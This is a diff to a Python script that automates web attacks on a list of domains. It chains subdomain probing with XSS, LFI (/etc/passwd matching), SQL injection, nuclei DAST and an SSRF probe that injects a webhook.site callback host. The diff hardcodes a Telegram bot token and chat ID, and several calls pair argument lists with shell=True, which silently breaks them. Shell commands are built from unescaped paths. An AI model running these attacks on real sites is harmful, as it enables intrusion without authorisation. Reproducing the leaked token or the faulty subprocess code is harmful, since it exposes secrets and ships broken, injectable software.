@@ -1,11 +1,11 @@
 import argparse
 import json
 import os
-import re
 import subprocess
 import time
+from datetime import datetime as date
+
 import requests
-from requests import RequestException
 import boto3
 from botocore.exceptions import ClientError
 from tqdm import tqdm
@@ -73,7 +73,7 @@ class MakeDirectories:
             # Create the main output directory
             if not os.path.isdir(self.output_file):  # True
                 os.makedirs(self.output_file)
-            dirs_list = ["hosts", "urls", "vuln"]
+            dirs_list = ["hosts", "urls", "js", "vuln"]
 
             # Create subdirectories
             for d in dirs_list:
@@ -107,7 +107,7 @@ class MakeDirectories:
                 "mantra.txt", "xss-kxss.txt", "xss-strike.txt", "xsshunter.txt",
                 "gitleaks-findings.txt", "trufflehog-findings.txt", "secretfinder-findings.txt",
                 "expanded-ips.txt", "subzy.txt", "subjack.txt", "open-redirect.txt", "lfi-map.txt", "openredirex.txt",
-                "s3-cli.txt", "clickjacking.txt"
+                "s3-cli.txt", "clickjacking.txt", "lfi-urls.txt", "lfi-subs.txt", "semgrep-findings.json"
             ]
             for v in vuln_files:
                 open(os.path.join(f"{self.output_file}/vuln/", v), "w").close()
@@ -137,13 +137,14 @@ class SubdomainsCollector:
     def probe(self):
         subdomains_file = f"{self.output_file}/hosts/subs.txt"
         httpx_output = f"{self.output_file}/hosts/httpx.txt"
-        httprobe_output = f"{self.output_file}/hosts/alive-hosts.txt"
+        alive_output = f"{self.output_file}/hosts/alive-hosts.txt"
         try:
             httpx_cmd = ['httpx', '-l', subdomains_file, '-sc', '-title', '-fr', '-o', httpx_output]
+            awk = "\'{print $1}\'"
             print(f"{color.GREEN}(+) Probing alive hosts{color.END}")
-            subprocess.run(f"cat {subdomains_file} | httprobe | sort -u | tee -a {httprobe_output}", check=True,
-                           shell=True)
             subprocess.run(httpx_cmd)
+            subprocess.run(f"cat {httpx_output} | awk {awk} | tee -a {alive_output}", check=True,
+                           shell=True)
 
         except Exception as e:
             print(f"{color.RED}Error occurred: {e}{color.END}")
@@ -350,7 +351,7 @@ class UrlFinder:
             gf_list = ['xss', 'ssrf', 'lfi', 'sqli', 'ssti']
             gf_output = f'{self.output_file}/urls/'
             for gf in gf_list:
-                subprocess.run(f'cat {urls} | gf {gf} | anew {gf_output}gf-{gf}.txt')
+                subprocess.run(f'cat {urls} | gf {gf} | anew {gf_output}gf-{gf}.txt', shell=True, check=True)
 
         except Exception as e:
             print(f"{color.RED}Error occurred during URL collection: {e}{color.END}")
@@ -371,6 +372,39 @@ class UrlFinder:
             doc_command = f"grep -E '{doc_file_types}' {self.output_file}/urls/all-urls.txt | anew {self.leaked_docs}"
             subprocess.run(doc_command, shell=True, check=True)
             print(f"{color.GREEN}[+] Completed: Sensitive documents saved to {self.leaked_docs}{color.END}")
+        except Exception as e:
+            print(f"{color.RED}Error occurred: {e}{color.END}")
+
+    def download_and_scan_js(self):
+        js_dir = f"{self.output_file}/js/"
+        os.makedirs(js_dir, exist_ok=True)
+        try:
+            print(f"{color.GREEN}[+] Downloading JavaScript files...{color.END}")
+            with open(self.js_output, "r") as file:
+                urls = file.read().splitlines()
+            downloaded_files = []
+            for url in urls:
+                try:
+                    response = requests.get(url)
+                    if response.status_code == 200:
+                        filename = os.path.join(js_dir, os.path.basename(url.split("?")[0]))
+                        with open(filename, "wb") as js_file:
+                            js_file.write(response.content)
+                        downloaded_files.append(filename)
+                        print(f"{color.GREEN}[+] Downloaded: {url}{color.END}")
+                    else:
+                        print(f"{color.RED}[-] Failed to download: {url} (Status {response.status_code}){color.END}")
+                except requests.exceptions.RequestException as e:
+                    print(f"{color.RED}[-] Error downloading {url}: {e}{color.END}")
+            # If no files were downloaded, skip Semgrep
+            if not downloaded_files:
+                print(f"{color.RED}[-] No JavaScript files were downloaded. Skipping Semgrep.{color.END}")
+                return
+            print(f"{color.GREEN}[+] Running Semgrep on downloaded JS files...{color.END}")
+            semgrep_command = f"semgrep --config=p/javascript --json --output {self.output_file}/vuln/semgrep-findings.json {js_dir}"
+            subprocess.run(semgrep_command, shell=True, check=True)
+            print(
+                f"{color.GREEN}[+] Completed: Semgrep findings saved to {self.output_file}/vuln/semgrep-findings.json{color.END}")
         except Exception as e:
             print(f"{color.RED}Error occurred: {e}{color.END}")
 
@@ -433,7 +467,8 @@ class XSS:
                 print(
                     f'{color.GREEN}(+) Testing for xss via CLI{color.END}\n{color.SKY_BLUE}(+) Testing payload: {xss_test}{color.END}')
                 subprocess.run(
-                    f'cat {xss_urls} | qsreplace \'{xss_test}\' | freq | grep -iv \'Not Vulnerable\' | tee -a {xss_output}')
+                    f'cat {xss_urls} | qsreplace \'{xss_test}\' | freq | grep -iv \'Not Vulnerable\' | tee -a {xss_output}',
+                    shell=True, check=True)
         except Exception as e:
             print(f"{color.RED}Error occurred: {e}{color.END}")
 
@@ -597,9 +632,15 @@ class LFI:
                         ]
         try:
             urls = f"{self.output_file}/urls/gf-lfi.txt"
-            output = f"{self.output_file}/vuln/lfi.txt"
-            # Execute httpx with all payloads in one go
-            httpx_cmd = f"cat {urls} | qsreplace {lfi_payloads} | httpx random-agent -mc 200 -mr 'root:[x*]:0:0:' | anew {output}"
+            output_urls = f"{self.output_file}/vuln/lfi-urls.txt"
+            subdomains = f"{self.output_file}/hosts/alive-hosts.txt"
+            output_subdomains = f"{self.output_file}/vuln/lfi-subs.txt"
+            # 0x01
+            httpx_cmd = f"cat {subdomains} | qsreplace {lfi_payloads} | httpx random-agent -mc 200 -mr 'root:[x*]:0:0:' -o {output_subdomains}"
+            print(f"{color.GREEN}(+) Testing for LFI{color.END}")
+            subprocess.run(httpx_cmd, check=True, shell=True)
+            # 0x02
+            httpx_cmd = f"cat {urls} | qsreplace {lfi_payloads} | httpx random-agent -mc 200 -mr 'root:[x*]:0:0:' -o {output_urls}"
             print(f"{color.GREEN}(+) Testing for LFI{color.END}")
             subprocess.run(httpx_cmd, check=True, shell=True)
         except Exception as e:
@@ -610,7 +651,7 @@ class LFI:
         output = f'{self.output_file}/vuln/lfi-map.txt'
         try:
             lfi_cmd = ['lfimap', '-F', lfi_urls, '-a', '--log', output]
-            subprocess.run(lfi_cmd)
+            subprocess.run(lfi_cmd, shell=True, check=True)
         except Exception as e:
             print(f"{color.RED}(-) Error occurred: {e}{color.END}")
 
@@ -716,7 +757,7 @@ class SSRF:
         urls = f'{self.output_file}/urls/gf-ssrf.txt'
         output = f'{self.output_file}/vuln/ssrf.txt'
         try:
-            ssrf_cmd = f"cat {urls} | qsreplace \'1z134eeifqphwp950qaecudroiu9i06p.oastify.com\' | xargs -I % -P 25 sh -c \'curl -ks \"%\" 2>&1 | grep \"compute.internal\" && echo \"SSRF VULN! %\"\' | anew {output}"
+            ssrf_cmd = f"cat {urls} | qsreplace \'webhook.site/ab053878-06c0-4f11-a087-61e22932c659\' | xargs -I % -P 25 sh -c \'curl -ks \"%\" 2>&1 | grep \"compute.internal\" && echo \"SSRF VULN! %\"\' | anew {output}"
             subprocess.run(ssrf_cmd, check=True, shell=True)
         except Exception as e:
             print(f"{color.RED}(-) Error occurred: {e}{color.END}")
@@ -734,7 +775,8 @@ class SQLI:
         with open(output, 'a') as f:
             for domain in urls:
                 # Construct the ghauri command for each domain
-                command = ["ghauri", "-u", f"http://{domain}", "--batch", "--ignore-code", "--level", "3", "--banner",
+                command = ["ghauri", "-u", f"http://{domain}", "--batch", "--ignore-code", "401,403", "--level", "3",
+                           "--banner",
                            "--hostname"]
 
                 try:
@@ -760,24 +802,58 @@ class Nuclei:
         self.templates = nuclei_templates
 
     def basic_nuclei(self):
-        urls = f'{self.output_file}/urls/all-urls.txt'
+        hosts = f'{self.output_file}/hosts/alive-hosts.txt'
         output = f'{self.output_file}/vuln/nuclei-output.txt'
+        templates = self.templates
         try:
-            nuclei_cmd = ['nuclei', '-l', urls, '-o', output]
-            print(f"{color.GREEN}(+) Nuclei active scanning {color.END}")
-            subprocess.run(nuclei_cmd)
+            if templates:
+                nuclei_cmd = ['nuclei', '-l', hosts, '-o', output, '-t', templates]
+                print(f"{color.GREEN}(+) Nuclei active scanning {color.END}")
+                subprocess.run(nuclei_cmd, shell=True, check=True)
+            else:
+                nuclei_cmd = ['nuclei', '-l', hosts, '-o', output]
+                print(f"{color.GREEN}(+) Nuclei active scanning {color.END}")
+                subprocess.run(nuclei_cmd, shell=True, check=True)
         except Exception as e:
             print(f"{color.RED}(-) Error occurred: {e}{color.END}")
 
     def dast_nuclei(self):
         urls = f'{self.output_file}/urls/all-urls.txt'
         output = f'{self.output_file}/vuln/nuclei-dast-output.txt'
+        templates = self.templates
         try:
-            nuclei_cmd = f"cat {urls} | nuclei --dast -o {output}"
-            subprocess.run(nuclei_cmd, check=True, shell=True)
-            print(f"{color.GREEN}(+) Nuclei dast active scanning {color.END}")
+            if templates:
+                nuclei_cmd = f"cat {urls} | nuclei --dast -t {templates} -o {output}"
+                subprocess.run(nuclei_cmd, check=True, shell=True)
+                print(f"{color.GREEN}(+) Nuclei dast active scanning {color.END}")
+            else:
+                nuclei_cmd = f"cat {urls} | nuclei --dast -o {output}"
+                subprocess.run(nuclei_cmd, check=True, shell=True)
+                print(f"{color.GREEN}(+) Nuclei dast active scanning {color.END}")
         except Exception as e:
             print(f"{color.RED}(-) Error occurred: {e}{color.END}")
+
+
+class TelegramNotify():
+    def __init__(self, telegram_token, telegram_chat_id):
+        self.token = telegram_token
+        self.chat_id = telegram_chat_id
+
+    def notify_telegram(self, token, chat_id, message):
+        """Send Telegram notification"""
+        url = f"https://api.telegram.org/bot{token}/sendMessage"
+        payload = {
+            'chat_id': chat_id,
+            'text': message,
+            'parse_mode': 'Markdown'
+        }
+
+        response = requests.post(url, json=payload)
+
+        if response.status_code == 200:
+            print("Notification sent successfully!")
+        else:
+            print(f"Failed to send notification: {response.status_code} - {response.text}")
 
 
 def done():
@@ -794,8 +870,8 @@ def done():
 def main():
     parser = argparse.ArgumentParser(description="Web Application Vulnerability Scanner")
     parser.add_argument("-d", "--domains", required=True, help="Path to file containing list of domains")
-    parser.add_argument("-templates", "--nuclei-templates", required=True, help="Path to nuclei templates")
-    parser.add_argument("-sstimap", "--sstimap-path", required=True, help="Path to SSTImap")
+    parser.add_argument("-templates", "--nuclei-templates", required=False, help="Path to nuclei templates")
+    parser.add_argument("-sstimap", "--sstimap-path", required=False, help="Path to SSTImap")
     parser.add_argument("-o", "--output", required=True, help="Output directory name")
     args = parser.parse_args()
 
@@ -803,32 +879,46 @@ def main():
     output_file = args.output
     sstimap_path = args.sstimap_path
     nuclei_templates = args.nuclei_templates
+    pwd = os.getcwd()
+    real_time = date.now()
+    formatted_time = real_time.strftime("%Y-%m-%d %H:%M:%S")
+    telegram_token = "7686565976:AAF2G3JH8ZSgsJS8BVFUbSctuGrlubGdJXo"
+    telegram_chat_id = "1272244351"
 
-    # Execute MakeDirectories class
+    # Create an instance of TelegramNotify
+    notifier = TelegramNotify(telegram_token, telegram_chat_id)
+    notifier.notify_telegram(telegram_token, telegram_chat_id,
+                             f"(+) Scan for {domains} Started at {formatted_time} Path:{pwd}")
+
+    # Create directories and notify
     make_dirs = MakeDirectories(output_file)
     make_dirs.mk_dirs()
+    notifier.notify_telegram(telegram_token, telegram_chat_id, f"(+) Directories created successfully")
 
-    # Execute SubdomainsCollectr class
+    # Execute SubdomainsCollector and notify
     subdomains_collector = SubdomainsCollector(domains, output_file)
     subdomains_collector.subfinder_subs()
     subdomains_collector.probe()
+    notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) Subdomain collection completed")
 
-    # Execute DmarcFinder
+    # Execute DmarcFinder and notify
     dmarc_finder = DmarcFinder(domains, output_file)
     dmarc_finder.validate_domains()
+    notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) DMARC domains validated")
 
-    # Execute SubdomainTakeOver
+    # Execute SubdomainTakeOver and notify
     subdomains_takeover = SubdomainTakeOver(domains, output_file)
     subdomains_takeover.get_cname()
     subdomains_takeover.subzy()
     subdomains_takeover.subjack()
+    notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) Subdomain takeover tests completed")
 
-    # Execute BucketFinder
-    bucket_finder = BucketFinder(domains, output_file)
+    # Execute BucketFinder and notify
+    # bucket_finder = BucketFinder(domains, output_file)
+    # notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) BucketFinder scan completed")
 
-    # Execute UrlFInder
+    # Execute `UrlFinder` and notify
     finder = UrlFinder(domains, output_file)
-    finder.collect_urls()
     finder.collect_urls()
     finder.extract_js_files()
     finder.extract_documents()
@@ -836,45 +926,56 @@ def main():
     finder.scan_for_secrets_with_gitleaks()
     finder.scan_for_secrets_with_trufflehog()
     finder.scan_for_sensitive_info_with_secretfinder()
+    notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) URL scan completed")
 
-    # Execute XSS
+    # Execute XSS and notify
     xss = XSS(domains, output_file)
     xss.xss_cli()
     xss.dalfox()
     xss.xsshunter()
+    notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) XSS tests completed")
 
-    # Execute OpenRedirect
+    # Execute OpenRedirect and notify
     open_redirect = OpenRedirect(domains, output_file)
     open_redirect.openredirex()
+    notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) Open Redirect scan completed")
 
-    # Execute Clickjacking
+    # Execute Clickjacking and notify
     click_jacking = Clickjacking(domains, output_file)
     click_jacking.x_frame_option()
+    notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) Clickjacking test completed")
 
-    # Execute LFI
+    # Execute LFI and notify
     lfi = LFI(domains, output_file)
     lfi.lfi_cli()
     lfi.lfi_map()
+    notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) LFI test completed")
 
-    # Execute SSTI
+    # # Execute SSTI and notify
     ssti = SSTI(domains, output_file, sstimap_path)
     ssti.ssti_cli()
-
-    # Execute SSRF
+    notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) SSTI test completed")
+    #
+    # # Execute SSRF and notify
     ssrf = SSRF(domains, output_file)
     ssrf.ssrf_cli()
+    notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) SSRF test completed")
 
-    # Execute SQLI
+    # Execute SQLI and notify
     sqli = SQLI(domains, output_file)
     sqli.ghauri()
+    notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) SQL Injection test completed")
 
-    # Execute Nuclei
+    # Execute Nuclei and notify
     nuclei = Nuclei(domains, output_file, nuclei_templates)
     nuclei.basic_nuclei()
     nuclei.dast_nuclei()
+    notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) Nuclei scan completed")
 
-    # The Scan is done
+    # The scan is done, notify
+    finder.download_and_scan_js()
     done()
+    notifier.notify_telegram(telegram_token, telegram_chat_id, "(+) Web Application Vulnerability Scan Completed")
 
 
 if __name__ == "__main__":
